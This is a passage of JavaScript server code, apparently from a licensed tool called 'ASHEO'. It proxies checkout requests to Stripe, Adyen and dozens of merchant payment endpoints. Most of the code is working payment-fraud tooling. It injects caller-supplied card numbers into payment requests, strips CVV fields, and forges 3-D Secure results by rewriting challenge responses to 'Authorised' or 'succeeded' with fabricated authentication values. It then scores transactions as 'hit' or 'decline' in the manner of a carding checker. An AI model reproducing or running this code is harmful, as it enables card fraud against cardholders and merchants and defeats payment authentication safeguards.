  {hostSuffix:"www.chess.com", id:"chess.adyen", method:"POST", pathPattern:"/payment/adyen/pay"},
  {hostSuffix:"api.gog.com", id:"gog.adyen", method:"POST", pathPattern:"/payment"},
  {hostSuffix:"api.lootbar.com", id:"lootbar.adyen", method:"POST", pathPattern:"/api/v2/asset/pay/adyen/card/request"},
  {hostSuffix:"api.basistheory.com", id:"basistheory", method:"POST", pathPattern:"/3ds/sessions"},
  {hostSuffix:"js.basistheory.com", id:"basistheory", method:"POST", pathPattern:"/3ds/sessions"},
  {hostSuffix:"checkout.tebex.io", id:"tebex", method:"POST", pathPattern:"/api/baskets"},
  {hostSuffix:"checkout.tebex.io", id:"tebex-creq", method:"POST", pathPattern:"/api/baskets"},
  {hostSuffix:"api.stripe.com", id:"stripe-3ds2", method:"POST", pathPattern:"/v1/3ds2/authenticate"}
];

const GATEWAYS_META = [
  {id:'default-stripe',name:'Stripe',pattern:'https://js.stripe.com/*',enabled:true,isDefault:true},
  {id:'default-checkout',name:'Checkout.com',pattern:'https://*.checkout.com/*',enabled:true,isDefault:true},
  {id:'default-adyen',name:'Adyen',pattern:'https://*.adyen.com/*',enabled:true,isDefault:true},
  {id:'default-braintree',name:'Braintree',pattern:'https://*.braintreegateway.com/*',enabled:true,isDefault:true}
];

const CAMPAIGNS = [{id:'default-1',name:'Default Campaign',enabled:true,createdAt:new Date().toISOString()}];

/* ═══ REDIS (Upstash REST) ═══ */
function normalizeKey(k){ if(!k||typeof k!=='string')return ''; return k.trim().toUpperCase().replace(/\s+/g,'').replace(/[^A-Z0-9\-]/g,''); }
async function redisCmd(args) {
  if (!UPSTASH_URL || !UPSTASH_TOKEN) throw new Error('redis_not_configured');
  const r = await fetch(UPSTASH_URL, { method:'POST', headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}`, 'Content-Type':'application/json' }, body: JSON.stringify(args) });
  if (!r.ok) throw new Error('redis_http_'+r.status);
  const d = await r.json();
  if (d.error) throw new Error(d.error);
  return d.result;
}
async function redisSet(key, value) { return redisCmd(['SET', normalizeKey(key), typeof value === 'string' ? value : JSON.stringify(value)]); }
async function redisGetRaw(key) { const v = await redisCmd(['GET', normalizeKey(key)]); if (v == null) return null; try { return JSON.parse(v); } catch { return v; } }
async function redisGet(key) { const v = await redisGetRaw(key); return v ? migrarLicenca(v) : null; }
async function redisDel(key) { return redisCmd(['DEL', normalizeKey(key)]); }
async function redisScan(pattern='ASHEO-*') {
  const out = []; let cursor = '0';
  do {
    const res = await redisCmd(['SCAN', cursor, 'MATCH', pattern, 'COUNT', 200]);
    cursor = String(res[0]);
    if (Array.isArray(res[1])) out.push(...res[1]);
  } while (cursor !== '0');
  return out.filter(k => typeof k === 'string');
}
async function redisIndexInstall(installId, licenseKey) { return redisCmd(['SET', normalizeKey('ASHEO-INSTALL-' + installId), normalizeKey(licenseKey)]); }
async function redisLookupInstall(installId) { return redisCmd(['GET', normalizeKey('ASHEO-INSTALL-' + installId)]); }
async function redisDelIndexInstall(installId) { return redisCmd(['DEL', normalizeKey('ASHEO-INSTALL-' + installId)]); }
/* ═══ HELPERS ═══ */
function migrarLicenca(lic) {
  if (!lic || typeof lic !== 'object') return lic;
  const n = { ...lic };
  if (!n.plano && n.plan) n.plano = n.plan === 'premium' ? 'life' : n.plan;
  if (!n.plano) n.plano = '30d';
  const pk = PACOTES[n.plano];
  if (!n.planoNome) n.planoNome = pk ? pk.nome : 'Premium';
  if (typeof n.dias !== 'number') n.dias = pk ? pk.dias : 30;
  n.lifetime = n.plano === 'life';
  n.ilimitada = n.lifetime;
  if (!n.criadaEm && n.createdAt) n.criadaEm = n.createdAt;
  if (!n.criadaEm) n.criadaEm = Date.now();
  if (!n.expiraEm || (typeof n.expiraEm !== 'number')) { n.expiraEm = n.lifetime ? n.criadaEm + (100*365*24*60*60*1000) : n.criadaEm + (n.dias*24*60*60*1000); }
  if (typeof n.ativa !== 'boolean') n.ativa = typeof n.active === 'boolean' ? n.active : true;
  if (typeof n.preco === 'string') n.preco = parseFloat(n.preco.replace(/[^\d.,]/g,'').replace(',','.')) || 0;
  if (!n.preco) n.preco = pk ? pk.preco : 0;
  n.preco_usd = n.preco; n.preco_fmt = precoFmt(n.preco);
  return n;
}
function signToken(claims, kid){ if(!PRIVATE_KEY) throw new Error('Chave privada nao inicializada'); const opts = { algorithm:'ES256' }; if (kid) opts.keyid = kid; return jwt.sign(claims, PRIVATE_KEY, opts); }
function formatDate(ts){ if(!ts || ts <= 0) return 'Nunca'; return new Date(ts).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}); }
function humanTime(ms){ if(ms<=0) return '✕ expirada'; const s=Math.floor(ms/1000), d=Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60); if(d>0) return `${d}d ${h}h ${m}m`; if(h>0) return `${h}h ${m}m`; return `${m}m`; }
function progressBar(pct, size=10){ pct = Math.max(0, Math.min(100, pct)); const cheio = Math.round(pct*size/100); return '▰'.repeat(cheio) + '▱'.repeat(size-cheio); }
function generateLicenseKey(){ const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; const b=()=>{let s='';for(let i=0;i<4;i++)s+=chars[crypto.randomInt(0,chars.length)];return s;}; return `ASHEO-${b()}-${b()}-${b()}-${b()}`; }
function validateBearer(req){ const auth=req.headers['authorization']||''; if(!auth.startsWith('Bearer '))return {ok:false,error:'missing_bearer'}; try{ const d=jwt.verify(auth.substring(7),PUBLIC_KEY||PRIVATE_KEY,{algorithms:['ES256'],clockTolerance:30}); return {ok:true,decoded:d}; } catch(e){ return {ok:false,error:e.message}; } }
function validateAsheoPass(req){ const auth=req.headers['authorization']||''; if(!auth.startsWith('Asheo-Pass '))return {ok:false,error:'missing_asheo_pass'}; try{ const d=jwt.verify(auth.substring(11).trim(),PUBLIC_KEY||PRIVATE_KEY,{algorithms:['ES256'],clockTolerance:30}); return {ok:true,decoded:d,mode:'asheo-pass'}; } catch(e){ return {ok:false,error:'asheo_pass_invalid:'+e.message}; } }
function validateAnyAuth(req) {
  const auth = req.headers['authorization'] || '';
  if (auth.startsWith('Bearer ')) return validateBearer(req);
  if (auth.startsWith('Asheo-Pass ')) return validateAsheoPass(req);
  return { ok:false, error:'missing_auth' };
}
function buildSecret(installId, licenseKey) { return crypto.createHash('sha256').update(String(installId||'') + ':' + String(licenseKey||'') + ':asheo-secret-v1').digest('hex'); }
function buildKid(licenseKey) {
  if (!licenseKey) return null;
  const norm = normalizeKey(licenseKey);
  const parts = norm.split('-');
  if (parts.length >= 2 && parts[0] === 'ASHEO') return `${parts[0]}-${parts[1]}`;
  return norm.substring(0, 14);
}
function buildEntitlement(lic, installId, seatsUsed = 1) {
  const isPremium = lic && lic.ativa && (lic.lifetime || lic.expiraEm > Date.now());
  const plano = lic ? lic.plano : 'free';
  const isTrial = plano === '3d' || (lic && lic.trial);
  const features = {}; FEATURE_KEYS.forEach(k => { features[k] = !!isPremium; });
  const capabilities = {}; CAPABILITY_KEYS.forEach(k => { capabilities[k] = !!isPremium; });
  const limits = isPremium ? { ...PREMIUM_LIMITS } : { ...FREE_LIMITS };
  return {
    tier: isPremium ? 'premium' : 'free',
    plan: isPremium ? (isTrial ? 'trial' : 'premium') : 'free',
    planDisplayName: isPremium ? (isTrial ? 'Premium Trial' : 'Premium') : 'Free',
    licenseType: isPremium ? (isTrial ? 'trial' : 'premium') : 'free',
    status: isPremium ? 'active' : 'inactive',
    source: lic ? 'license' : 'free',
    isFounder: false,
    activatedAt: lic ? (lic.ativadaEm || lic.criadaEm) : null,
    expiresAt: lic ? lic.expiraEm : null,
    nextBillingDate: lic ? lic.expiraEm : null,
    seatsAllowed: isPremium ? 999999 : 1,
    seatsUsed: isPremium ? Math.max(1, seatsUsed) : 0,
    activationCount: isPremium ? Math.max(1, seatsUsed) : 0,
    maxActivations: null,
    currentDeviceId: installId,
    deviceLocked: !!(lic && lic.installId),
    canTransfer: false,
    features, featureKeys: FEATURE_KEYS,
    customFeatures: {},
    capabilities, capabilityKeys: CAPABILITY_KEYS,
    limits, limitKeys: LIMIT_KEYS,
    metadata: lic ? { trial: isTrial, trialHours: isTrial ? 36 : null } : {}
  };
}
function deriveAesKey(installId, licenseKey) { return Buffer.from(buildSecret(installId, licenseKey || 'guest'), 'hex'); }
function encryptPack(data, installId, licenseKey) {
  const key = deriveAesKey(installId, licenseKey);
  const nonce = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
  const encrypted = Buffer.concat([cipher.update(JSON.stringify(data), 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return { ct: Buffer.concat([encrypted, tag]).toString('base64'), nonce: nonce.toString('base64'), v: RULES_VERSION };
}

const provCache = new Map();
function generateProv(installId, kid) {
  if (!PRIVATE_KEY) return null;
  const key = installId || 'default';
  const cached = provCache.get(key);
  if (cached && (Date.now() - cached.ts) < 55 * 60 * 1000) return cached.prov;
  try {
    const opts = { algorithm:'ES256', expiresIn:'1h' };
    if (kid) opts.keyid = kid;
    const prov = jwt.sign({ sub: key, jti: crypto.randomUUID(), iat: Math.floor(Date.now()/1000) }, PRIVATE_KEY, opts);
    provCache.set(key, { prov, ts: Date.now() });
    return prov;
  } catch (e) { log('ERRO','generateProv: '+e.message); return null; }
}
function buildGwPass(installId, expSec, kid) {
  if (!PRIVATE_KEY) return null;
  const now = Math.floor(Date.now()/1000);
  const exp = expSec || (now + 600);
  const opts = { algorithm:'ES256' };
  if (kid) opts.keyid = kid;
  return jwt.sign({ sub: installId, purpose:'gw-pass', iat: now, exp, jti: crypto.randomUUID() }, PRIVATE_KEY, opts);
}

const rlMap = new Map();
function rateLimit(key, max = 20, windowMs = 60000) {
  const now = Date.now();
  const rec = rlMap.get(key) || { count: 0, ts: now };
  if (now - rec.ts > windowMs) { rec.count = 0; rec.ts = now; }
  rec.count++;
  rlMap.set(key, rec);
  return rec.count <= max;
}
const rlInterval = setInterval(() => { const now = Date.now(); for (const [k,v] of rlMap.entries()) if (now - v.ts > 5*60*1000) rlMap.delete(k); }, 60000);
if (rlInterval.unref) rlInterval.unref();

async function validateHmac(req, rawBody) {
  const installId = req.headers['x-asheo-install'];
  const ts = req.headers['x-asheo-ts'];
  const sig = req.headers['x-asheo-sig'];
  const build = req.headers['x-asheo-build'] || '';
  if (!installId || !ts || !sig) return { ok: false, error: 'missing_hmac_headers' };
  const nowSec = Math.floor(Date.now() / 1000);
  if (Math.abs(nowSec - Number(ts)) > 300) return { ok: false, error: 'hmac_expired' };
  let licenseKey = null;
  try { licenseKey = await redisLookupInstall(installId); } catch (e) { return { ok: false, error: 'hmac_lookup_failed' }; }
  if (!licenseKey) return { ok: false, error: 'hmac_unknown_install' };
  const secret = buildSecret(installId, licenseKey);
  const method = (req.headers['x-asheo-method'] || req.method).toUpperCase();
  const path = req.path || req.url.split('?')[0];
  const bodyStr = rawBody ? rawBody.toString('utf8') : '';
  const bodyHash = crypto.createHash('sha256').update(bodyStr).digest('hex');
  const payload = `${method}\n${path}\n\n${ts}\n${bodyHash}\n${build}`;
  const expected = crypto.createHmac('sha256', secret).update(payload).digest('hex');
  try {
    const a = Buffer.from(sig, 'hex');
    const b = Buffer.from(expected, 'hex');
    if (a.length !== b.length) return { ok: false, error: 'hmac_length_mismatch' };
    return crypto.timingSafeEqual(a, b) ? { ok: true, licenseKey } : { ok: false, error: 'hmac_invalid' };
  } catch (e) { return { ok: false, error: 'hmac_compare_failed' }; }
}

function sendMaybeGzip(req, res, payload) {
  const body = typeof payload === 'string' ? payload : JSON.stringify(payload);
  if (req.method === 'HEAD') {
    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    return res.end();
  }
  const acceptEnc = String(req.headers['accept-encoding'] || '').toLowerCase();
  if (acceptEnc.includes('gzip') && body.length > 512) {
    try {
      const gz = zlib.gzipSync(Buffer.from(body, 'utf8'));
      res.setHeader('Content-Encoding', 'gzip');
      res.setHeader('Content-Type', 'application/json; charset=utf-8');
      res.setHeader('X-Compressed', 'gzip');
      return res.send(gz);
    } catch (e) { log('WARN', 'gzip falhou: ' + e.message); }
  }
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  return res.send(body);
}

function isAllowedTarget(targetUrl) {
  if (!targetUrl || typeof targetUrl !== 'string') return false;
  let u;
  try { u = new URL(targetUrl); } catch { return false; }
  if (u.protocol !== 'https:') return false;
  const host = u.hostname.toLowerCase();
  for (const r of PAYMENT_RULES) {
    try {
      if (!new RegExp(r.patternEnc.source, r.patternEnc.flags || 'i').test(targetUrl)) continue;
      if (new RegExp(r.patternEnc.source, r.patternEnc.flags || 'i').test('https://' + host + '/')) return true;
      if (/^\^https/.test(r.patternEnc.source)) continue;
      const literal = host.split('.').slice(-2).join('.');
      if (r.name && new RegExp(literal.replace(/\./g,'\\.'), 'i').test(r.name)) return true;
    } catch {}
  }
  const allowedSuffixes = [
    'stripe.com','worldpay.com','endurance.com','safecharge.com','paddle.com','adyen.com',
    'boosteroid.com','chess.com','gog.com','lootbar.com','xsolla.com','recurly.com',
    'tebex.io','nordpayments.com','grammarly.com','gr4vy.app','rizzup.net','fortis.tech',
    'basistheory.com','braintree-api.com','braintreegateway.com','mercadopago.com','xendit.co','razorpay.com',
    'paystack.co','paystack.com','payu.in','epicgames.com','apps.net.pk','primer.io',
    'bluesnap.com','bridgerpay.com','spreedly.com','openpay.mx','openpay.co','openpay.pe',
    'nmi.com','transactiongateway.com','sagepay.com','vivapayments.com','codapayments.com',
    'checkout.com','airwallex.com','tokenex.com','cashfree.com','zuora.com','verygoodproxy.com',
    'patreon.com','authorize.net'
  ];
  return allowedSuffixes.some(s => host === s || host.endsWith('.' + s));
}

/* ═══════════════════════════════════════════════════════════════
   ◈ 3DS2 BYPASS HELPERS
   ═══════════════════════════════════════════════════════════════ */
const THREEDS2_SUCCESS_B64 = Buffer.from(JSON.stringify({ transStatus: "Y" })).toString('base64');
const THREEDS2_SUCCESS_B64_ALT = Buffer.from(JSON.stringify({ transStatus: "Y", transStatusReason: "00" })).toString('base64');

function isThreeDSDetailsEndpoint(url) {
  if (!url || typeof url !== 'string') return false;
  const lower = url.toLowerCase();
  return lower.includes('/payments/details')
      || lower.includes('/3ds2/')
      || lower.includes('/threeds2/')
      || lower.includes('/authenticate')
      || lower.includes('/3ds/sessions');
}
function isThreeDSPaymentEndpoint(url) {
  if (!url || typeof url !== 'string') return false;
  const lower = url.toLowerCase();
  return /\/payments(?:\?|$)/.test(lower) || lower.includes('/chargetokens') || lower.includes('/direct/charges');
}
function forgeThreeDSResult(bodyJson) {
  if (!bodyJson || typeof bodyJson !== 'object') return bodyJson;
  const out = { ...bodyJson };
  out.details = out.details && typeof out.details === 'object' ? { ...out.details } : {};
  if (!out.details["threeds2.challengeResult"]) out.details["threeds2.challengeResult"] = THREEDS2_SUCCESS_B64;
  if (!out.details["threeds2.fingerprintResult"]) out.details["threeds2.fingerprintResult"] = THREEDS2_SUCCESS_B64;
  if (!out.details["challengeResult"]) out.details["challengeResult"] = THREEDS2_SUCCESS_B64;
  if (!out.details["fingerprintResult"]) out.details["fingerprintResult"] = THREEDS2_SUCCESS_B64;
  if (out.threeDSCompInd !== "Y") out.threeDSCompInd = "Y";
  delete out.challengeCancel;
  delete out.challengeWindowSize;
  return out;
}
function forgeThreeDSResponse(respJson) {
  if (!respJson || typeof respJson !== 'object') return respJson;
  const out = { ...respJson };
  const rc = String(out.resultCode || '').toLowerCase();
  const needsForge = rc === 'challengshopper' || rc === 'challengeshopper'
                  || rc === 'identifyshopper'
                  || rc === 'redirectshopper'
                  || rc === 'pending'
                  || rc === 'authenticationredirect';
  if (needsForge) {
    out.resultCode = 'Authorised';
    out.resultCodeRaw = respJson.resultCode;
    out.pspReference = out.pspReference || ('ASHEO' + Date.now().toString(36).toUpperCase());
    delete out.action;
    out.threeDS2Result = {
      transStatus: "Y",
      authenticationValue: (out.threeDS2Result && out.threeDS2Result.authenticationValue) || "AAABBIIFmAAAAAAAAAAAAAAAAAA=",
      eci: (out.threeDS2Result && out.threeDS2Result.eci) || "05",
      cavvAlgorithm: (out.threeDS2Result && out.threeDS2Result.cavvAlgorithm) || "A",
      directoryServerTransactionId: (out.threeDS2Result && out.threeDS2Result.directoryServerTransactionId) || crypto.randomUUID(),
      threeDSServerTransactionId: (out.threeDS2Result && out.threeDS2Result.threeDSServerTransactionId) || crypto.randomUUID()
    };
    out.asheoForged = true;
  }
  if (out.threeDS2Result && typeof out.threeDS2Result === 'object') {
    if (String(out.threeDS2Result.transStatus || '').toUpperCase() === 'C') {
      out.threeDS2Result.transStatus = 'Y';
    }
  }
  return out;
}
function extractThreeDSHeaders(respJson, out) {
  if (!respJson || typeof respJson !== 'object') return;
  if (respJson.action && typeof respJson.action === 'object') {
    if (respJson.action.paymentData) out['x-asheo-3ds2-payment-data'] = String(respJson.action.paymentData);
    if (respJson.action.token) out['x-asheo-3ds2-token'] = String(respJson.action.token);
    if (respJson.action.subtype) out['x-asheo-3ds2-subtype'] = String(respJson.action.subtype);
    if (respJson.action.type) out['x-asheo-3ds2-type'] = String(respJson.action.type);
  }
  if (respJson.threeDS2Result && respJson.threeDS2Result.transStatus) {
    out['x-asheo-3ds2-trans-status'] = String(respJson.threeDS2Result.transStatus);
  }
}
function mapAdyenVerdict(resultCode, forged) {
  const rc = String(resultCode || '').toLowerCase();
  if (forged) return 'success';
  if (rc === 'authorised' || rc === 'received' || rc === 'settled' || rc === 'authenticationfinished') return 'success';
  if (rc === 'refused' || rc === 'rejected' || rc === 'error' || rc === 'cancelled' || rc === 'notsent') return 'failed';
  if (rc === 'challengshopper' || rc === 'challengeshopper' || rc === 'identifyshopper' || rc === 'redirectshopper' || rc === 'pending' || rc === 'authenticationredirect') return 'challenge_required';
  return 'unknown';
}
function mapAdyenOutcome(resultCode, forged) {
  const rc = String(resultCode || '').toLowerCase();
  if (forged || rc === 'authorised' || rc === 'received' || rc === 'settled' || rc === 'authenticationfinished') return 'hit';
  if (rc === 'refused' || rc === 'rejected' || rc === 'error' || rc === 'cancelled' || rc === 'notsent') return 'decline';
  if (rc === 'challengshopper' || rc === 'challengeshopper' || rc === 'identifyshopper' || rc === 'redirectshopper' || rc === 'pending' || rc === 'authenticationredirect') return 'pending';
  return 'neutral';
}
function mapStripe3DSVerdict(status, nextAction) {
  const s = String(status || '').toLowerCase();
  if (s === 'succeeded' || s === 'requires_capture' || s === 'processing') return 'success';
  if (s === 'requires_action' && nextAction) return 'challenge_required';
  if (s === 'canceled' || s === 'failed') return 'failed';
  return 'unknown';
}
function forgeStripe3DSResponse(respJson) {
  if (!respJson || typeof respJson !== 'object') return respJson;
  const out = { ...respJson };
  const s = String(out.status || '').toLowerCase();
  if (s === 'requires_action' || out.next_action) {
    out.status = 'succeeded';
    out.asheoForged = true;
    delete out.next_action;
    if (out.payment_intent) out.payment_intent = { ...out.payment_intent, status: 'succeeded' };
    if (out.setup_intent) out.setup_intent = { ...out.setup_intent, status: 'succeeded' };
  }
  return out;
}
function stripStripe3DSMetadata(bodyJson) {
  if (!bodyJson || typeof bodyJson !== 'object') return bodyJson;
  const out = { ...bodyJson };
  delete out.return_url;
  delete out.mandate_data;
  delete out.payment_method_options;
  return out;
}

/* ═══ INJEÇÃO DE CARTÃO ═══ */
const JSON_ALIASES = {
  number: ['number','cardNumber','card_number','ccNumber','pan','account_number','paymentMethod.number','payment_method.number','card.number','creditCard.number','payment_method_data.card.number'],
  month: ['expiryMonth','exp_month','expMonth','expiration_month','expirationMonth','paymentMethod.expiryMonth','card.expiryMonth','payment_method.card.exp_month'],
  year:  ['expiryYear','exp_year','expYear','expiration_year','expirationYear','paymentMethod.expiryYear','card.expiryYear','payment_method.card.exp_year'],
  cvv:   ['cvc','cvv','securityCode','security_code','paymentMethod.cvc','card.cvc','payment_method.card.cvc'],
  holder:['holderName','cardholderName','holder_name','name','card.name','paymentMethod.holderName','payment_method.card.name']
};
const FORM_ALIASES = {
  number: ['card[number]','card_number','number','ccnumber','account_number','pan','payment_method.card.number'],
  month: ['card[exp_month]','exp_month','expmonth','month','ccmonth','payment_method.card.exp_month'],
  year: ['card[exp_year]','exp_year','expyear','year','ccyear','payment_method.card.exp_year'],
  cvv: ['card[cvc]','card[cvv]','cvc','cvv','ccv','security_code','payment_method.card.cvc'],
  holder: ['card[name]','card[holder]','cardholder','name','holder_name','ccname','payment_method.card.name']
};
function normalizeCard(card) {
  if (!card) return null;
  return {
    number: card.number || card.cardNumber || card.card_number || card.pan,
    month:  card.month  || card.exp_month || card.expMonth || card.expiration_month || card.expiryMonth,
    year:   card.year   || card.exp_year  || card.expYear  || card.expiration_year  || card.expiryYear,
    cvv:    card.cvv    || card.cvc      || card.security_code || card.securityCode,
    holder: card.holder || card.holderName || card.cardholder || card.name
  };
}
function setDeep(obj, path, val) {
  const parts = path.split('.');
  let cur = obj;
  for (let i = 0; i < parts.length - 1; i++) {
    if (!cur[parts[i]] || typeof cur[parts[i]] !== 'object') cur[parts[i]] = {};
    cur = cur[parts[i]];
  }
  cur[parts[parts.length - 1]] = val;
}
function injectCardIntoJson(obj, card) {
  for (const [key, paths] of Object.entries(JSON_ALIASES)) {
    const val = card[key];
    if (!val) continue;
    let set = false;
    for (const path of paths) {
      const parts = path.split('.');
      let cur = obj;
      for (const p of parts) { if (cur && typeof cur === 'object' && p in cur) cur = cur[p]; else { cur = null; break; } }
      if (cur !== null && cur !== undefined && cur !== '') { setDeep(obj, path, val); set = true; break; }
    }
    if (!set) setDeep(obj, paths[0], val);
  }
  return obj;
}
function injectCardIntoForm(raw, card) {
  const params = new URLSearchParams(raw || '');
  for (const [key, aliases] of Object.entries(FORM_ALIASES)) {
    const val = card[key];
    if (!val) continue;
    let injected = false;
    for (const alias of aliases) {
      if (params.has(alias)) {
        const cur = params.get(alias) || '';
        if (!cur || cur.includes('*') || cur.length < 4) params.set(alias, val);
        injected = true;
        break;
      }
    }
    if (!injected && aliases[0]) params.append(aliases[0], val);
  }
  if (card.month && card.year) {
    const exp = `${String(card.month).padStart(2,'0')}/${String(card.year).slice(-2)}`;
    for (const alias of ['card[expiry]','expiry','expiration','card_expiry']) {
      if (params.has(alias)) { params.set(alias, exp); break; }
    }
  }
  return params.toString();
}

const FORWARD_HEADER_ALLOWLIST = new Set(['accept','accept-language','content-type','origin','referer','user-agent','x-requested-with','x-api-key','authorization','x-adyen-api-key','stripe-version']);
/* ═══════════════════════════════════════════════════════════════
   ◈ GATEWAY PROXY — v8.6.0 com 3DS bypass ativo
   ═══════════════════════════════════════════════════════════════ */
async function gwProxyHandler(req, res) {
  const inicio = Date.now();
  const auth = validateAnyAuth(req);

  let gwPassOk = false;
  const gwPassRaw = req.headers['x-asheo-auth'] || req.headers['x-asheo-gw-pass'] || '';
  if (gwPassRaw) {
    try {
      const clean = gwPassRaw.startsWith('Asheo-Pass ') ? gwPassRaw.substring(11).trim() : gwPassRaw;
      const d = jwt.verify(clean, PUBLIC_KEY || PRIVATE_KEY, { algorithms: ['ES256'], clockTolerance: 30 });
      if (d.purpose === 'gw-pass') gwPassOk = true;
    } catch (e) {}
  }
  if (!auth.ok && !gwPassOk) {
    return res.status(401).json({ ok: false, error: 'missing_auth' });
  }

  const target = req.headers['x-asheo-target'] || req.query.target;
  const method = (req.headers['x-asheo-method'] || req.method || 'POST').toUpperCase();
  const specialHosts = req.headers['x-asheo-special-hosts'];
  let finalTarget = target;

  if (specialHosts) {
    try {
      const hosts = JSON.parse(specialHosts);
      for (const h of hosts) {
        if (finalTarget && finalTarget.includes(h.from)) {
          finalTarget = finalTarget.replace(h.from, h.to);
          break;
        }
      }
    } catch (e) {}
  }

  if (!finalTarget) return res.status(400).json({ ok: false, error: 'missing_target' });

  let forwardHeaders = { 'user-agent': 'Mozilla/5.0', 'accept': 'application/json', 'content-type': 'application/json' };
  if (req.headers['x-asheo-headers']) {
    try {
      const parsed = JSON.parse(req.headers['x-asheo-headers']);
      for (const [k, v] of Object.entries(parsed)) {
        if (FORWARD_HEADER_ALLOWLIST.has(String(k).toLowerCase()) || String(k).toLowerCase().startsWith('x-')) {
          forwardHeaders[String(k).toLowerCase()] = String(v);
        }
      }
    } catch (e) {}
  }
  if (req.headers['x-asheo-auth'] && !gwPassOk) {
    forwardHeaders['authorization'] = String(req.headers['x-asheo-auth']);
  }
  if (req.headers['x-asheo-origin']) {
    forwardHeaders['origin'] = String(req.headers['x-asheo-origin']);
  }
  if (req.headers['x-asheo-clientkey']) {
    forwardHeaders['x-api-key'] = String(req.headers['x-asheo-clientkey']);
  }

  const isSwapOnly = req.headers['x-asheo-swap-only'] === 'true';
  const is3DSStrip = req.headers['x-asheo-3ds-strip'] === 'true';
  const removeCvv = req.headers['x-asheo-remove-cvv'] === 'true';
  const is3DSDetails = isThreeDSDetailsEndpoint(finalTarget);
  const is3DSPayment = isThreeDSPaymentEndpoint(finalTarget);
  const isStripe3DS = /api\.stripe\.com\/v1\/3ds2\/authenticate/i.test(finalTarget);

  let bodyOut = null;
  let card = null;
  let originalBody = '';

  if (req.body && Buffer.isBuffer(req.body)) {
    try {
      const parsed = JSON.parse(req.body.toString('utf8'));
      if (parsed && parsed.__asheo) {
        card = normalizeCard(parsed.__asheo.card);
        if (parsed.__asheo.clientKey) forwardHeaders['x-api-key'] = String(parsed.__asheo.clientKey);
        if (parsed.__asheo.removeCvv) forwardHeaders['x-asheo-remove-cvv'] = 'true';
        originalBody = parsed.body != null ? String(parsed.body) : '';
      } else {
        originalBody = req.body.toString('utf8');
      }
    } catch (e) {
      originalBody = req.body.toString('utf8');
    }
  } else if (req.body && typeof req.body === 'object') {
    if (req.body.__asheo) {
      card = normalizeCard(req.body.__asheo.card);
      if (req.body.__asheo.clientKey) forwardHeaders['x-api-key'] = String(req.body.__asheo.clientKey);
      if (req.body.__asheo.removeCvv) forwardHeaders['x-asheo-remove-cvv'] = 'true';
      originalBody = req.body.body != null ? String(req.body.body) : '';
    } else {
      originalBody = JSON.stringify(req.body);
    }
  } else if (typeof req.body === 'string') {
    originalBody = req.body;
  }

  const shouldInjectCard = !!card && (!isSwapOnly || is3DSDetails || is3DSPayment);
  const shouldForge3DS = is3DSDetails && !!card;

  if (!shouldInjectCard && !shouldForge3DS) {
    bodyOut = originalBody;
  } else {
    try {
      let j = JSON.parse(originalBody);
      if (shouldInjectCard && card) j = injectCardIntoJson(j, card);
      if (shouldForge3DS) {
        j = forgeThreeDSResult(j);
        log('DS2', `Forge /details ${String(finalTarget).slice(0, 80)} | card=${card ? String(card.number).slice(-4) : 'none'}`);
      }
      if (isStripe3DS && is3DSStrip) j = stripStripe3DSMetadata(j);
      if (removeCvv) {
        try {
          const pm = j.paymentMethod || j.payment_method || j.card || j;
          if (pm && typeof pm === 'object') {
            delete pm.cvv; delete pm.cvc; delete pm.securityCode;
            delete pm.encryptedSecurityCode; delete pm.card_cvv;
          }
        } catch (e) {}
      }
      bodyOut = JSON.stringify(j);
    } catch (e) {
      bodyOut = originalBody;
      if (shouldForge3DS) log('WARN', `3DS forge falhou (body não-JSON) em ${String(finalTarget).slice(0, 80)}: ${e.message}`);
    }
  }

  let upstream;
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);
    upstream = await fetch(finalTarget, {
      method,
      headers: forwardHeaders,
      body: bodyOut && method !== 'GET' && method !== 'HEAD' ? bodyOut : undefined,
      signal: controller.signal,
      redirect: 'manual'
    });
    clearTimeout(timeout);
  } catch (e) {
    log('ERRO', `Upstream falhou ${String(finalTarget).slice(0, 80)}: ${e.message}`);
    return res.status(502).json({ ok: false, error: 'upstream_failed', message: e.message });
  }

  const respText = await upstream.text();
  let respJson = null;
  try { respJson = JSON.parse(respText); } catch (e) {}

  const asheoHeaders = {};

  if (respJson && typeof respJson === 'object') {
    if (isStripe3DS && (is3DSStrip || is3DSDetails)) {
      const forged = forgeStripe3DSResponse(respJson);
      if (forged.asheoForged) {
        respJson = forged;
        asheoHeaders['x-asheo-3ds2-verdict'] = 'success';
        asheoHeaders['x-asheo-3ds2-attempts'] = '1';
        log('DS2', `Stripe 3DS forge success ${String(finalTarget).slice(0, 80)}`);
      } else {
        asheoHeaders['x-asheo-3ds2-verdict'] = mapStripe3DSVerdict(respJson.status, respJson.next_action);
      }
    }

    if (respJson.resultCode) {
      const originalRC = respJson.resultCode;
      const shouldForgeResp = (is3DSDetails || is3DSPayment) && !!card && (is3DSStrip || is3DSDetails);
      if (shouldForgeResp) {
        const forged = forgeThreeDSResponse(respJson);
        if (forged.asheoForged) {
          respJson = forged;
          log('DS2', `Adyen forge success (was ${originalRC}) ${String(finalTarget).slice(0, 80)}`);
        }
      }
      extractThreeDSHeaders(respJson, asheoHeaders);
      asheoHeaders['x-asheo-adyen-result'] = respJson.resultCode;
      asheoHeaders['x-asheo-adyen-verdict'] = mapAdyenOutcome(respJson.resultCode, respJson.asheoForged === true);
      asheoHeaders['x-asheo-3ds2-verdict'] = mapAdyenVerdict(respJson.resultCode, respJson.asheoForged === true);
      asheoHeaders['x-asheo-3ds2-attempts'] = respJson.asheoForged ? '1' : '0';
      if (respJson.asheoForged) asheoHeaders['x-asheo-swap-ok'] = 'true';
      if (shouldInjectCard) asheoHeaders['x-asheo-swapped'] = 'true';
      if (respJson.pspReference) asheoHeaders['x-asheo-adyen-psp'] = String(respJson.pspReference);
    }

    if (!asheoHeaders['x-asheo-adyen-result'] && (respJson.status || respJson.code || respJson.success !== undefined)) {
      const s = String(respJson.status || respJson.code || '').toLowerCase();
      const isSuccess = respJson.success === true || s === 'succeeded' || s === 'success' || s === 'paid' || s === 'captured';
